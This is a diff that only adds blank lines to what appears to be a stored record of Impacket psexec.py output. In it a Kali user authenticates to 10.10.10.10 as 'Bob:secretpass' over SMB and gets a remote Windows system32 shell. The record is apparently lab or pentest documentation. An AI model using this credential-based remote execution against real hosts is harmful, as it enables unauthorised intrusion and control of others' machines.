@@ -8,7 +8,9 @@ output: 'root@kali:~# psexec.py Bob:secretpass@10.10.10.10
 
   Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation
 
+
   INFO:root:Trying protocol 445/SMB...
+
 
   INFO:impacket:Requesting shares on 10.10.10.10.....
 
@@ -27,6 +29,7 @@ output: 'root@kali:~# psexec.py Bob:secretpass@10.10.10.10
   Microsoft Windows [Version 10.0.18362.295]
 
   (c) 2019 Microsoft Corporation. All rights reserved.
+
 
   C:\Windows\system32>'
 created_at: '2019-10-01T17:58:48.946488+00:00'
@@ -59,3 +62,5 @@ Microsoft Windows [Version 10.0.18362.295]
 
 C:\Windows\system32>
 ```
+
+
